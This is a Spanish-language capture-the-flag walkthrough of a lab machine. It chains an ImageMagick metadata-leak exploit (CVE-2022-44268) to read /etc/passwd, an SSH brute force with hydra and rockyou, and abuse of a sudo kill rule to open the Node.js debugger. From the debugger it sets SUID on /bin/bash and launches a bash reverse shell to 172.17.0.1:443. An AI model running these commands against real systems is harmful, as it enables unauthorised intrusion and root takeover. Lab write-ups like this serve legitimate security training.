nmap:  443, 80, 22

![image](https://github.com/user-attachments/assets/49f75831-c32a-4554-9753-b7c610099ee0)


---
entramos a la pagina principal y nos da esto:

![image](https://github.com/user-attachments/assets/7e0cb7f2-b4e8-47a6-8a08-10226e7e6d2c)


hay una subida de imagen o pdf y encontré este exploit que roba metadatos: https://github.com/voidz0r/CVE-2022-44268

seguimos los pasos y subimos la imagen 1200x1200

![image](https://github.com/user-attachments/assets/1fa9aaf9-cfe5-4db4-b69d-23a73cd077bf)


después guardamos la foto desde la pagina subida y al guardarla nos dará muchos números.

![image](https://github.com/user-attachments/assets/a2472f55-bf63-499f-a542-2beb191ae383)


lanzamos este comando con el numero dentro de los ""

>python3 -c 'print(bytes.fromhex("con el numero que nos dio"))'

y nos dará el listado de "/etc/passwd" con un usuario llamado "lenam"

hacemos fuerza bruta

     - hydra -l lenam -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2

nos da la contraseña: loverboy

![image](https://github.com/user-attachments/assets/f72bfc59-fd0a-4045-8ba8-c2d7e9a9a7d5)

dentro al hacer sudo -l aparece: "kill"

![image](https://github.com/user-attachments/assets/e5a0d4e9-ac1b-4ca7-a0b2-cd5a2b7a87d3)

al hacer un "ps aux" vemos que en el PID 53 se ejecuta un "index.js"

![image](https://github.com/user-attachments/assets/c6cfc13b-ad4f-4d5c-8cfe-179beb50b297)


buscamos en: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse

y vemos que podemos escalar con: kill -s SIGUSR1 nodejs-ps

![image](https://github.com/user-attachments/assets/16c17a4c-28fa-4d27-9154-40b98c1d9c6e)


que quedaría:  sudo kill -s SIGUSR1 49 (o según se ejecute en este caso 49)
ahora si ejecutamos: netstat -atunop vemos que se reinicia ya hora esta habitado el puerto 9229

![image](https://github.com/user-attachments/assets/6f69a3a4-d8f6-4f5b-ae2e-e64e50264c60)


nos conectamos por la IP y puerto que da:  node inspect 127.0.0.1:9229

dentro del debug ejecutamos: 

    - exec("process.mainModule.require('child_process').exec('chmod u+s /bin/bash')")

ahora salimos y ejecutamos el bash -p

![image](https://github.com/user-attachments/assets/191e37dc-13ec-4e4f-a04b-84e8155b9eb1)


pero no somos root absoluto, modificamos el código para una reverse shell

    - exec("process.mainModule.require('child_process').exec('bash -c \"/bin/bash -i >& /dev/tcp/172.17.0.1/443 0>&1\"')")

![image](https://github.com/user-attachments/assets/119aa68f-4cb6-4dfd-b1ce-5d3d4f717e32)


y somos root!
